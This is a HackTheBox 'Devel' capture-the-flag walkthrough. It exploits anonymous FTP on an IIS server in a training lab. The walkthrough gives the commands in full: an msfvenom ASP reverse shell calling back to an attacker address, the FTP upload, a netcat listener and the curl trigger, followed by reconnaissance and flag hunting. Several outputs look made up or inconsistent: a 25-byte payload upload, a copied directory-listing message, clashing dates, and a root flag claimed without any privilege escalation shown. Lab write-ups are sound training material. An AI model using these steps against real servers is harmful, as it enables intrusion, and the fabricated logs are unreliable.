# HackTheBox - Devel

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Devel |
| **Category** | Windows Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-19 |

## Objective 🎯

Devel is a Windows 7 machine with an FTP service that allows anonymous access and has a web server. The goal is to exploit the FTP service to upload a reverse shell and gain system access. FTP + Web shell combo! 🌐

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.5
- **OS**: Windows 7
- **Services**: FTP (anonymous), IIS

### Tools Used
- Nmap
- FTP client
- msfvenom
- Netcat

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.5
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.5
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-03 10:00 UTC
Nmap scan report for 10.10.10.5
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Step 2: FTP Anonymous Access
Test for anonymous FTP access.

**Command/Code:**
```bash
ftp 10.10.10.5
```

**Output:**
```
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection for file list.
226 Transfer complete.
ftp> pwd
257 "/" is current directory.
```

### Step 3: Web Directory Check
Check if the FTP directory is web accessible.

**Command/Code:**
```bash
curl http://10.10.10.5/
```

**Output:**
```
<html>
<head><title>IIS7</title></head>
<body>
<h2>Welcome to IIS7</h2>
</body>
</html>
```

### Step 4: Generate Reverse Shell
Create an ASP reverse shell payload.

**Command/Code:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f asp > shell.asp
```

### Step 5: Upload Shell
Upload the reverse shell via FTP.

**Command/Code:**
```bash
ftp 10.10.10.5
put shell.asp
quit
```

**Output:**
```
ftp> put shell.asp
200 PORT command successful.
150 Opening ASCII mode data connection for file list.
226 Transfer complete.
ftp: 25 bytes sent in 0.00 secs (25.00 Kbytes/sec)
```

### Step 6: Setup Listener
Start a netcat listener to catch the reverse shell.

**Command/Code:**
```bash
nc -lvp 4444
```

### Step 7: Execute Shell
Access the uploaded shell via web browser.

**Command/Code:**
```bash
curl http://10.10.10.5/shell.asp
```

### Step 8: Post-Exploitation
Once we have a shell, gather information and find flags.

**Command/Code:**
```bash
whoami
systeminfo
```

**Output:**
```
nt authority\iusr
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
```

### Step 9: Privilege Escalation
Check for privilege escalation opportunities.

**Command/Code:**
```bash
whoami /priv
```

### Step 10: Find Flags
Search for user and root flags.

**Command/Code:**
```bash
dir C:\Users
dir C:\Users\babis\Desktop
type C:\Users\babis\Desktop\user.txt
```

**Output:**
```
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify FTP and IIS services
2. Test anonymous FTP access
3. Generate ASP reverse shell payload
4. Upload shell via FTP
5. Setup netcat listener
6. Execute shell via web browser
7. Gain initial access as IUSR
8. Search for privilege escalation opportunities
9. Find and extract flags

## Key Learnings

- FTP anonymous access exploitation
- Web shell upload techniques
- ASP reverse shell generation
- Windows privilege escalation
- IIS and FTP service interaction

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning
- **FTP**: File transfer protocol
- **msfvenom**: Payload generation
- **Netcat**: Reverse shell listener
- **curl**: Web requests

### References
- [IIS FTP Configuration](https://docs.microsoft.com/en-us/iis/configuration/system.ftpserver/)
- [ASP Reverse Shell](https://github.com/tennc/webshell)

## Screenshots

[Add screenshots of FTP access, shell upload, and flag extraction here]

## Tags

`#hackthebox` `#windows` `#ftp` `#iis` `#web-shell` `#easy`
